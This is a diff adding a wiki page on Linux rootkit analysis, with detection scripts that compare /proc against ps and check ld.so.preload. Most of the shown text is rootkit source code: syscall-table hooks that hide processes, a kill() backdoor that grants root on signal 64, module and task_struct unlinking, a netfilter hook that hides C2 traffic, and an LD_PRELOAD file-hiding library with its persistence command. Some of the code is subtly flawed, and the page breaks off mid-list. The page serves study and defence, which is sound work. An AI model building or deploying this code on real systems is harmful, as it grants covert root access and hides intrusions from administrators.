@@ -1,0 +1,1473 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Rootkit Analysis | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Rootkit Analysis">
+		<meta name="keywords" content="detection, kernel, ld-preload, lkm, reverse-engineering, rootkit, syscall-hooking">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Rootkit Analysis">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Analyze Linux rootkits by examining kernel module hooking, system call table tampering, file system manipulation, and user-space library interception.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/reverse-engineering/rootkit-analysis.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Rootkit Analysis">
+		<meta name="twitter:description" itemprop="description" content="Analyze Linux rootkits by examining kernel module hooking, system call table tampering, file system manipulation, and user-space library interception.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#kernel-vs-userland-rootkits">Kernel vs Userland Rootkits</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#kernel-rootkit-architecture">Kernel Rootkit Architecture</a></b>
+					<ul>
+						<li><a href="#finding-the-sys-call-table">Finding the sys_call_table</a></li>
+						<li><a href="#the-bytes-ff-14-c5-correspond-to">The bytes 'ff 14 c5' correspond to</a></li>
+						<li><a href="#syscall-table-hooking">Syscall Table Hooking</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#vfs-hooking">VFS Hooking</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#module-hiding-concealing-from-lsmod">Module Hiding (Concealing from lsmod)</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#netfilter-hooking">Netfilter Hooking</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#process-hiding-via-task-struct">Process Hiding Via task_struct</a></b>
+					<ul>
+						<li><a href="#detection-of-hidden-processes">Detection of hidden processes</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#userland-rootkit-analysis">Userland Rootkit Analysis</a></b>
+					<ul>
+						<li><a href="#libc-function-hooking">libc Function Hooking</a></li>
+						<li><a href="#detecting-userland-rootkits">Detecting Userland Rootkits</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#analyzing-suspicious-kernel-modules">Analyzing Suspicious Kernel Modules</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#python-sys-call-table-integrity-check">Python: sys_call_table Integrity Check</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#diamorphine-rootkit-analysis">Diamorphine Rootkit Analysis</a></b>
+					<ul>
+						<li><a href="#diamorphine-string-analysis">Diamorphine String Analysis</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#rootkit-detection-workflow">Rootkit Detection Workflow</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#comparing-kernel-and-rootkit-views">Comparing Kernel And Rootkit Views</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#summary">Summary</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/reverse-engineering/index.html">Reverse Engineering</a></li>
+						<li aria-current="page"><a href="/wiki/articles/reverse-engineering/rootkit-analysis.html">Rootkit Analysis</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="rootkit-analysis">Rootkit Analysis</h2>
+					<p>
+						Analyze Linux rootkits by examining kernel module hooking, system call table tampering, file
+						system manipulation, and user-space library interception.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							A rootkit is software that hides its presence by subverting the operating system mechanisms
+							used to detect it. Linux rootkits work at two levels: kernel-space loadable modules that modify
+							kernel structures, and user-space libraries that intercept the system calls a process makes.
+							This article dissects both, then builds detection tools that compare what the kernel knows with
+							what user-space tools report.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/system-calls.html">System Calls</a> - Linux system call mechanism, syscall table, user->kernel transition</li>
+							<li><a href="/wiki/articles/fundamentals/processes.html">Processes</a> - process lifecycle, task_struct, process hiding</li>
+							<li><a href="/wiki/articles/reverse-engineering/ld-preload.html">LD_PRELOAD</a> - userland function hooking via LD_PRELOAD</li>
+						</ul>
+						<p>---</p>
+						<p>
+							A rootkit is software that hides its presence by subverting the OS mechanisms used to detect
+							it. It manipulates the same kernel structures that tools like
+							<code>ps</code>
+							,
+							<code>ls</code>
+							,
+							<code>netstat</code>
+							, and
+							<code>ss</code>
+							rely on. If
+							<code>ps</code>
+							reads
+							<code>/proc</code>
+							to list processes, the rootkit intercepts that read and
+							removes its own PID from the output. The defining characteristic of a rootkit is not what it
+							does (backdoor, keylogger,
+							<abbr title="Distributed Denial of Service">DDoS</abbr>
+							) but that it actively hides
+							evidence of its existence.
+						</p>
+						<p>
+							Rootkits operate at two levels: kernel-space (LKM - Loadable Kernel Module, modifies kernel
+							memory and structures) and user-space (LD_PRELOAD, ptrace, or shared library replacement). The
+							analysis approach differs fundamentally between the two.
+						</p>
+					</section>
+					<section>
+						<h3 id="kernel-vs-userland-rootkits">Kernel vs Userland Rootkits</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Property</th>
+									<th align="center">Kernel-Level Rootkit</th>
+									<th align="center">Userland Rootkit (LD_PRELOAD)</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Privilege required</td>
+									<td align="center">Root (insmod / modprobe)</td>
+									<td align="center">Root (write /etc/ld.so.preload) or User</td>
+								</tr>
+								<tr>
+									<td align="center">Persistence mechanism</td>
+									<td align="center">Installs kernel module, hooks kernel structs</td>
+									<td align="center">Writes to /etc/ld.so.preload,~/.bashrc</td>
+								</tr>
+								<tr>
+									<td align="center">Visibility</td>
+									<td align="center">Invisible to userland tools</td>
+									<td align="center">Partially visible (kernel still reports truth)</td>
+								</tr>
+								<tr>
+									<td align="center">Hiding capability</td>
+									<td align="center">Processes, files, connections, modules, ports</td>
+									<td align="center">Processes (via /proc), files (via readdir), connections</td>
+								</tr>
+								<tr>
+									<td align="center">Detection difficulty</td>
+									<td align="center">High - need kernel-level introspection</td>
+									<td align="center">Medium - compare kernel vs userland views</td>
+								</tr>
+								<tr>
+									<td align="center">Performance impact</td>
+									<td align="center">Minimal - runs in kernel context</td>
+									<td align="center">Per-process overhead (hooked libc calls)</td>
+								</tr>
+								<tr>
+									<td align="center">Stability risk</td>
+									<td align="center">High - kernel bug = kernel panic</td>
+									<td align="center">Low - crashes affect only hooked process</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/modules</code>impact</td>
+									<td align="center">Module hidden from listing</td>
+									<td align="center">No effect on kernel modules</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/kallsyms</code>impact</td>
+									<td align="center">Symbols can be hidden (if kptr_restrict=0)</td>
+									<td align="center">No effect on kernel symbols</td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="kernel-rootkit-architecture">Kernel Rootkit Architecture</h3>
+						<p>An LKM rootkit has three phases:</p>
+						<ol>
+							<li><b>Module load</b> ( <code>init_module</code> ): locate kernel structures, save original function pointers, install hooks</li>
+							<li><b>Operational phase</b> : hooks intercept specific events, filter results before returning to userspace</li>
+							<li><b>Module unload</b> ( <code>cleanup_module</code> ): restore original function pointers (few rootkits implement this properly - many crash the kernel on unload)</li>
+						</ol>
+						<h4 id="finding-the-sys-call-table">Finding the sys_call_table</h4>
+						<p>
+							The sys_call_table is an array of function pointers, one per system call number. Historically
+							it was exported via
+							<code>kallsyms</code>
+							:
+						</p>
+						<pre class="c">
+/* /proc/kallsyms entry (on kernels with kptr_restrict=0):
+ * ffffffff820001e0 R sys_call_table
+ */
+
+/* But modern kernels unexport it. Rootkits find it by:
+ *   1. Scanning kernel .text for syscall handler prototypes
+ *   2. Reading /proc/kallsyms (if kptr_restrict permits)
+ *   3. Using kallsyms_lookup_name() (if exported)
+ *   4. Following the MSR_LSTAR (x86_64 syscall entry point)
+ */
+
+// Modern rootkit approach: find via MSR
+#include &lt;asm/msr.h&gt;
+
+static unsigned long *find_sys_call_table(void)
+{
+    unsigned long syscall_entry;
+    rdmsrl(MSR_LSTAR, syscall_entry);
+
+    /* The entry point (entry_SYSCALL_64) contains:
+     *   call *sys_call_table(, %rax, 8)
+     * The bytes are: ff 14 c5 XX XX XX XX
+     * where XX XX XX XX is the address of sys_call_table
+     */
+
+    unsigned char *code = (unsigned char *)syscall_entry;
+
+    for (unsigned int i = 0; i &lt; 0x200; i++) {
+        /* Look for &#39;call *sys_call_table(,%rax,8)&#39; = ff 14 c5 &lt;disp32&gt; */
+        if (code[i] == 0xff &amp;&amp; code[i + 1] == 0x14 &amp;&amp; code[i + 2] == 0xc5) {
+            /* The disp32 immediately after the opcode is the table address */
+            unsigned int table_addr;
+            memcpy(&amp;table_addr, code + i + 3, sizeof(table_addr));
+            return (unsigned long *)table_addr;
+        }
+    }
+
+    return NULL;
+}
+						</pre>
+						<h4 id="the-bytes-ff-14-c5-correspond-to">The bytes 'ff 14 c5' correspond to</h4>
+						<pre class="plaintext">
+ff 14 c5 &lt;4-byte-absolute-address&gt;
+= CALL r/m64  (opcode FF /2) with SIB byte 14 c5
+14 c5 = Scale=8, Index=RAX, Base=None (absolute addressing)
+-&gt; This is the encoding for: call *sys_call_table(, %rax, 8)
+						</pre>
+						<h4 id="syscall-table-hooking">Syscall Table Hooking</h4>
+						<p>Once the table address is found, overwrite an entry:</p>
+						<pre class="c">
+/*
+ * basic_rootkit.c - syscall table hook demonstration
+ *
+ * This is a CONCEPTUAL example. Actual kernel module compilation
+ * requires kernel headers matching the running kernel:
+ *   pacman -S linux-headers
+ *   make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
+ *
+ * The module demonstrates the syscall hooking principle.
+ * DO NOT load unsigned kernel modules on production systems.
+ */
+
+#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/syscalls.h&gt;
+#include &lt;linux/dirent.h&gt;
+#include &lt;linux/cred.h&gt;
+#include &lt;linux/sched.h&gt;
+#include &lt;linux/pid.h&gt;
+#include &lt;linux/string.h&gt;
+#include &lt;linux/version.h&gt;
+
+MODULE_LICENSE(&#34;GPL&#34;);
+MODULE_AUTHOR(&#34;RE Analysis Lab&#34;);
+MODULE_DESCRIPTION(&#34;Syscall hooking rootkit - analysis artifact&#34;);
+
+/* Original syscall function pointers */
+static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
+
+/* The actual sys_call_table address (found at runtime) */
+static unsigned long *sys_call_table = NULL;
+
+/* ── Syscall table discovery ─────────────────────────────────────────── */
+
+static unsigned long *find_syscall_table(void)
+{
+    /* In kernel modules, use kallsyms_lookup_name if available */
+    /* On older kernels (pre-5.7), sys_call_table was exported: */
+    #ifdef CONFIG_KALLSYMS
+        /* kallsyms_lookup_name was unexported in 5.7; need kprobes */
+        #include &lt;linux/kprobes.h&gt;
+
+        typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+        static kallsyms_lookup_name_t lookup;
+
+        struct kprobe kp = { .symbol_name = &#34;kallsyms_lookup_name&#34; };
+        if (register_kprobe(&amp;kp) &lt; 0) return NULL;
+        lookup = (kallsyms_lookup_name_t)kp.addr;
+        unregister_kprobe(&amp;kp);
+
+        unsigned long *table = (unsigned long *)lookup(&#34;sys_call_table&#34;);
+        return table;
+    #else
+        return NULL;
+    #endif
+}
+
+/* After 5.7, rootkits use kprobes or manual disassembly of entry_SYSCALL_64 */
+
+/* ── Hiding a process from ps / /proc ────────────────────────────────── */
+
+asmlinkage long hooked_getdents64(const struct pt_regs *regs)
+{
+    long ret = orig_getdents64(regs);
+
+    if (ret &lt;= 0) return ret;
+
+    /* Walk the dirent buffer returned by the kernel */
+    struct linux_dirent64 *dir, *prev = NULL, *kdirent;
+    unsigned long offset = 0;
+
+    kdirent = kzalloc(ret, GFP_KERNEL);
+    if (!kdirent) return ret;
+
+    /* Copy the returned buffer from userspace to kernel space */
+    if (copy_from_user(kdirent, (void __user *)regs-&gt;si, ret)) {
+        kfree(kdirent);
+        return ret;
+    }
+
+    while (offset &lt; ret) {
+        dir = (struct linux_dirent64 *)((char *)kdirent + offset);
+
+        /* If this directory entry is our hidden process directory */
+        if (strstr(dir-&gt;d_name, &#34;hidden_proc_name&#34;) != NULL) {
+            if (prev) {
+                /* Remove this entry by extending the previous one */
+                prev-&gt;d_reclen += dir-&gt;d_reclen;
+            } else {
+                /* First entry - set d_ino to 0 (invalidates entry) */
+                dir-&gt;d_ino = 0;
+            }
+        } else {
+            prev = dir;
+        }
+
+        offset += dir-&gt;d_reclen;
+    }
+
+    /* Copy the sanitized buffer back to userspace */
+    if (copy_to_user((void __user *)regs-&gt;si, kdirent, ret)) {
+        kfree(kdirent);
+        return ret;
+    }
+
+    kfree(kdirent);
+    return ret;
+}
+
+/* ── Magic packet backdoor ───────────────────────────────────────────── */
+
+static unsigned int magic_port = 31337;
+static unsigned char magic_packet[] = { 0xde, 0xad, 0xbe, 0xef };
+
+asmlinkage long hooked_kill(const struct pt_regs *regs)
+{
+    /* Use the kill() syscall as a covert channel:
+     *   kill(&lt;magic_pid&gt;, &lt;magic_sig&gt;) -&gt; trigger action
+     * Rootkits often use kill(0, SIG&lt;magic&gt;) or specific signals
+     * to trigger backdoor actions: spawn reverse shell, grant root
+     */
+
+    pid_t pid = (pid_t)regs-&gt;di;   /* arg1 = pid */
+    int   sig = (int)regs-&gt;si;     /* arg2 = signal */
+
+    /* Magic signal 64 -&gt; give caller root */
+    if (sig == 64 &amp;&amp; pid == task_tgid_vnr(current)) {
+        struct cred *new = prepare_kernel_cred(NULL);
+        if (new) {
+            new-&gt;uid.val = new-&gt;gid.val = 0;
+            new-&gt;euid.val = new-&gt;egid.val = 0;
+            new-&gt;suid.val = new-&gt;sgid.val = 0;
+            new-&gt;fsuid.val = new-&gt;fsgid.val = 0;
+            commit_creds(new);
+        }
+        return 0;  /* Don&#39;t deliver the actual signal */
+    }
+
+    /* Pass through to original handler */
+    return orig_kill(regs);
+}
+
+/* ── Module init / exit ──────────────────────────────────────────────── */
+
+static int __init rootkit_init(void)
+{
+    /* Disable write protection on the syscall table page */
+    unsigned long cr0;
+    cr0 = read_cr0();
+    write_cr0(cr0 &amp; ~0x10000);  /* Clear WP (Write Protect) bit in CR0 */
+
+    sys_call_table = find_syscall_table();
+    if (!sys_call_table) {
+        write_cr0(cr0);  /* Restore WP */
+        printk(KERN_ERR &#34;rootkit: cannot find sys_call_table\n&#34;);
+        return -EFAULT;
+    }
+
+    /* Save original handlers */
+    orig_getdents64 = (void *)sys_call_table[__NR_getdents64];
+    orig_kill        = (void *)sys_call_table[__NR_kill];
+
+    /* Install hooks */
+    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
+    sys_call_table[__NR_kill]        = (unsigned long)hooked_kill;
+
+    /* Restore write protection */
+    write_cr0(cr0);
+
+    printk(KERN_INFO &#34;rootkit: loaded, syscall table hooked\n&#34;);
+    return 0;
+}
+
+static void __exit rootkit_exit(void)
+{
+    unsigned long cr0 = read_cr0();
+    write_cr0(cr0 &amp; ~0x10000);
+
+    if (sys_call_table) {
+        sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
+        sys_call_table[__NR_kill]        = (unsigned long)orig_kill;
+    }
+
+    write_cr0(cr0);
+    printk(KERN_INFO &#34;rootkit: unloaded\n&#34;);
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+						</pre>
+						<p>
+							The CR0 write-protect manipulation is necessary because the sys_call_table resides in read-only
+							memory. Clearing bit 16 (WP flag) temporarily allows the kernel to write to read-only pages.
+							This is a legacy technique - modern rootkits use
+							<code>text_poke_bp</code>
+							or kprobes to avoid CR0 manipulation.
+						</p>
+					</section>
+					<section>
+						<h3 id="vfs-hooking">VFS Hooking</h3>
+						<p>
+							A stealthier approach than syscall table modification: hook Virtual File System operations instead.
+							VFS hooks are function pointers in
+							<code>struct file_operations</code>
+							and
+							<code>struct inode_operations</code>
+							-
+							manipulating these is harder to detect than syscall table entries.
+						</p>
+						<pre class="c">
+/*
+ * VFS-based file hiding rootkit (conceptual)
+ *
+ * Replaces the readdir file_operation of the proc filesystem
+ * to hide process directory entries. More targeted than
+ * syscall hooking - only affects /proc reads, not ls /home.
+ */
+
+#include &lt;linux/fs.h&gt;
+#include &lt;linux/proc_fs.h&gt;
+
+typedef int (*filldir_t)(void *, const char *, int, loff_t, u64, unsigned);
+
+static filldir_t orig_filldir = NULL;
+
+static int hooked_filldir(void *ctx, const char *name, int namelen,
+                          loff_t offset, u64 ino, unsigned d_type)
+{
+    /* Hide entries matching our rootkit&#39;s process name */
+    if (strstr(name, &#34;hidden_process&#34;))
+        return 0;  /* Skip this entry - never add to directory listing */
+
+    return orig_filldir(ctx, name, namelen, offset, ino, d_type);
+}
+
+/* To hook /proc&#39;s filldir, the rootkit would:
+ *   1. Locate the proc filesystem&#39;s superblock
+ *   2. Traverse to the directory inode for /proc
+ *   3. Replace the filldir callback in the file_operations
+ * This requires deep kernel structure traversal.
+ */
+						</pre>
+					</section>
+					<section>
+						<h3 id="module-hiding-concealing-from-lsmod">Module Hiding (Concealing from lsmod)</h3>
+						<p>
+							<code>lsmod</code>
+							reads
+							<code>/proc/modules</code>
+							, which is populated by iterating the
+							<code>modules</code>
+							linked list in
+							kernel memory. A rootkit removes itself from this list:
+						</p>
+						<pre class="c">
+/* Before hiding: lsmod shows the module
+ * Module                  Size  Used by
+ * rootkit                16384  0
+ *
+ * After hiding: module absent from lsmod output
+ * (But still loaded - /sys/module/&lt;name&gt; still exists)
+ */
+
+static struct list_head *prev_module_node;
+
+static void hide_module(void)
+{
+    /* Remove from the modules linked list */
+    /* In kernels where THIS_MODULE-&gt;list is still accessible: */
+    prev_module_node = THIS_MODULE-&gt;list.prev;  /* Save for unhiding */
+    list_del(&amp;THIS_MODULE-&gt;list);
+
+    /* Zero out module information to defeat /sys/module introspection */
+    memset(&amp;THIS_MODULE-&gt;name, 0, sizeof(THIS_MODULE-&gt;name));
+    THIS_MODULE-&gt;state = MODULE_STATE_UNFORMED;
+
+    /* Note: THIS_MODULE-&gt;list is no longer accessible in modern kernels
+     * (kernel lockdown). Malware uses alternate structures or
+     * manipulates the kobject sysfs visibility instead. */
+}
+						</pre>
+					</section>
+					<section>
+						<h3 id="netfilter-hooking">Netfilter Hooking</h3>
+						<p>
+							Rootkits hook netfilter to hide
+							<abbr title="Command and Control">C2</abbr>
+							connections:
+						</p>
+						<pre class="c">
+#include &lt;linux/netfilter.h&gt;
+#include &lt;linux/netfilter_ipv4.h&gt;
+#include &lt;linux/ip.h&gt;
+#include &lt;linux/tcp.h&gt;
+
+static struct nf_hook_ops nfho;
+
+static unsigned int hook_packet(void *priv, struct sk_buff *skb,
+                                const struct nf_hook_state *state)
+{
+    struct iphdr *iph = ip_hdr(skb);
+
+    if (iph-&gt;protocol == IPPROTO_TCP) {
+        struct tcphdr *tcph = tcp_hdr(skb);
+
+        /* Hide packets from/to our C2 port (31337) */
+        if (ntohs(tcph-&gt;source) == 31337 || ntohs(tcph-&gt;dest) == 31337)
+            return NF_DROP;  /* Silently drop - connection is invisible */
+
+        /* More sophisticated: redirect C2 packets to loopback */
+        /* So ss/netstat sees a localhost connection instead of external */
+    }
+
+    return NF_ACCEPT;
+}
+
+/* Registration in init_module():
+ * nfho.hook     = hook_packet;
+ * nfho.pf       = PF_INET;
+ * nfho.hooknum  = NF_INET_PRE_ROUTING;
+ * nfho.priority = NF_IP_PRI_FIRST;
+ * nf_register_net_hook(&amp;init_net, &amp;nfho);
+ */
+						</pre>
+					</section>
+					<section>
+						<h3 id="process-hiding-via-task-struct">Process Hiding Via task_struct</h3>
+						<p>
+							Processes in Linux are tracked by a doubly-linked list of
+							<code>task_struct</code>
+							nodes.
+							<code>ps</code>
+							and
+							<code>/proc</code>
+							iterate this list. Removing a
+							<code>task_struct</code>
+							from the list hides the process:
+						</p>
+						<pre class="c">
+/*
+ * Process hiding by task_struct list removal (conceptual)
+ *
+ * The init_task is the root of the task list.
+ * Each task_struct has:
+ *   struct list_head tasks;    // links to next/prev process
+ *   struct list_head children; // child processes
+ *   struct list_head sibling;  // sibling processes
+ *
+ * Removing a task_struct from &#39;tasks&#39; makes it invisible to
+ * for_each_process() - which means invisible to ps and /proc enumeration.
+ * However, the process itself continues running (scheduled by PID, not list).
+ */
+
+static void hide_task(pid_t pid)
+{
+    struct task_struct *task;
+
+    for_each_process(task) {  /* This iterates the &#39;tasks&#39; list */
+        if (task-&gt;pid == pid) {
+            list_del(&amp;task-&gt;tasks);   /* Remove from the global list */
+            /* Process now invisible to ps, but still runnable */
+            return;
+        }
+    }
+}
+						</pre>
+						<h4 id="detection-of-hidden-processes">Detection of hidden processes</h4>
+						<pre class="bash">
+# Method 1: Compare /proc with ps output
+ls -d /proc/[0-9]* | wc -l          # Count all PIDs visible in /proc
+ps aux | wc -l                      # Count processes visible to ps
+# If /proc count &gt; ps count, a rootkit is filtering ps
+
+# Method 2: PID bruteforce
+for pid in $(seq 1 65535); do
+    if [ -d &#34;/proc/$pid&#34; ] &amp;&amp; ! ps -p &#34;$pid&#34; &gt;/dev/null 2&gt;&amp;1; then
+        echo &#34;Hidden process: PID $pid&#34;
+        cat /proc/$pid/cmdline 2&gt;/dev/null | tr &#39;\0&#39; &#39; &#39;
+        echo
+    fi
+done
+
+# Method 3: Kill signal test
+for pid in $(ls -d /proc/[0-9]* 2&gt;/dev/null | cut -d/ -f3); do
+    kill -0 &#34;$pid&#34; 2&gt;/dev/null || echo &#34;Process $pid exists in /proc but not killable&#34;
+done
+						</pre>
+					</section>
+					<section>
+						<h3 id="userland-rootkit-analysis">Userland Rootkit Analysis</h3>
+						<p>
+							Userland rootkits hook libc functions via
+							<code>LD_PRELOAD</code>
+							or library replacement. They are simpler
+							but easier to detect.
+						</p>
+						<h4 id="libc-function-hooking">libc Function Hooking</h4>
+						<pre class="c">
+/*
+ * userland_rootkit.c - LD_PRELOAD-based process/file/connection hiding
+ *
+ * Compile:
+ *   gcc -shared -fPIC -fno-builtin -o libreplace.so userland_rootkit.c -ldl -lcap
+ *
+ * Install (malicious persistence):
+ *   echo &#34;/usr/lib/libreplace.so&#34; &gt;&gt; /etc/ld.so.preload
+ *
+ * Effect: every process on the system now filters its own view of reality.
+ */
+
+#define _GNU_SOURCE
+#include &lt;dlfcn.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;dirent.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/types.h&gt;
+
+/* ── Get original function pointers ──────────────────────────────────── */
+
+static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
+static struct dirent64 *(*orig_readdir64)(DIR *dirp) = NULL;
+static int (*orig_open)(const char *, int, ...) = NULL;
+static int (*orig_stat)(int, const char *, struct stat *) = NULL;
+static int (*orig_stat64)(int, const char *, struct stat64 *) = NULL;
+static int (*orig_lstat)(const char *, struct stat *) = NULL;
+
+/* Lists of strings to hide */
+static const char *hidden_files[] = {
+    &#34;rootkit.so&#34;,
+    &#34;hidden_binary&#34;,
+    &#34;malware_config&#34;,
+    &#34;drop_payload&#34;,
+    NULL
+};
+
+static const char *hidden_prefixes[] = {
+    &#34;/proc/&#34;,     /* Hide /proc entries matching our PIDs */
+    NULL
+};
+
+__attribute__((constructor))
+static void init(void)
+{
+    orig_readdir   = (void *)dlsym(RTLD_NEXT, &#34;readdir&#34;);
+    orig_readdir64 = (void *)dlsym(RTLD_NEXT, &#34;readdir64&#34;);
+    orig_open      = (void *)dlsym(RTLD_NEXT, &#34;open&#34;);
+    orig_stat      = (void *)dlsym(RTLD_NEXT, &#34;__xstat&#34;);
+    orig_stat64    = (void *)dlsym(RTLD_NEXT, &#34;__xstat64&#34;);
+    orig_lstat     = (void *)dlsym(RTLD_NEXT, &#34;__lxstat&#34;);
+}
+
+/* ── Hide files from directory listings ──────────────────────────────── */
+
+static int should_hide_filename(const char *name)
+{
+    for (int i = 0; hidden_files[i]; i++) {
+        if (strstr(name, hidden_files[i]))
+            return 1;
+    }
+    return 0;
+}
+
+struct dirent *readdir(DIR *dirp)
+{
+    struct dirent *ent;
+    while ((ent = orig_readdir ? orig_readdir(dirp) : NULL) != NULL) {
+        if (!should_hide_filename(ent-&gt;d_name))
+            return ent;
+        /* Entry hidden - continue to next */
+    }
+    return NULL;
+}
+
+struct dirent64 *readdir64(DIR *dirp)
+{
+    struct dirent64 *ent;
+    while ((ent = orig_readdir64 ? orig_readdir64(dirp) : NULL) != NULL) {
+        if (!should_hide_filename(ent-&gt;d_name))
+            return ent;
+    }
+    return NULL;
+}
+
+/* ── Hide files from stat/open ───────────────────────────────────────── */
+
+static int should_hide_path(const char *path)
+{
+    if (!path) return 0;
+    for (int i = 0; hidden_files[i]; i++) {
+        if (strstr(path, hidden_files[i]))
+            return 1;
+    }
+    /* Also hide /proc/&lt;our_pid&gt;/* entries */
+    return 0;
+}
+
+int open(const char *pathname, int flags, ...)
+{
+    if (should_hide_path(pathname)) {
+        errno = ENOENT;
+        return -1;
+    }
+    return orig_open ? orig_open(pathname, flags) : -1;
+}
+
+int __xstat(int ver, const char *path, struct stat *buf)
+{
+    if (should_hide_path(path)) {
+        errno = ENOENT;
+        return -1;
+    }
+    return orig_stat ? orig_stat(ver, path, buf) : -1;
+}
+
+int __lxstat(int ver, const char *path, struct stat *buf)
+{
+    if (should_hide_path(path)) {
+        errno = ENOENT;
+        return -1;
+    }
+    return orig_lstat ? orig_lstat(ver, path, buf) : -1;
+}
+						</pre>
+						<h4 id="detecting-userland-rootkits">Detecting Userland Rootkits</h4>
+						<pre class="bash">
+# 1. Check /etc/ld.so.preload
+cat /etc/ld.so.preload
+# Any entry not belonging to a package is suspicious
+
+# 2. Check process maps for unknown libraries
+for pid in $(pgrep -f &#39;&#39;); do
+    grep -l &#39;\.so&#39; /proc/$pid/maps 2&gt;/dev/null | while read map; do
+        awk &#39;{print $NF}&#39; /proc/$pid/maps | grep &#39;\.so$&#39; | sort -u
+    done | sort -u &gt; /tmp/libs_pid_$pid.txt
+done
+# Cross-reference with known packages:
+pacman -Qo $(cat /tmp/libs_pid_*.txt | sort -u) 2&gt;&amp;1 | grep &#39;No package owns&#39;
+
+# 3. Statically linked test - bypass libc hooks entirely
+# Compile a statically-linked binary that does not use libc:
+cat &gt; test_dir.c &lt;&lt; &#39;EOF&#39;
+#define _GNU_SOURCE
+#include &lt;unistd.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;linux/dirent.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(void) {
+    int fd = open(&#34;.&#34;, O_RDONLY | O_DIRECTORY);
+    char buf[4096];
+    int n;
+    struct linux_dirent *d;
+
+    n = syscall(SYS_getdents, fd, buf, sizeof(buf));
+    for (int pos = 0; pos &lt; n; ) {
+        d = (struct linux_dirent *)(buf + pos);
+        printf(&#34;%s\n&#34;, d-&gt;d_name);
+        pos += d-&gt;d_reclen;
+    }
+    return 0;
+}
+EOF
+gcc -static -o test_dir test_dir.c
+./test_dir  # Shows files that LD_PRELOAD rootkit may be hiding
+
+# 4. Compare tool outputs with and without LD_PRELOAD
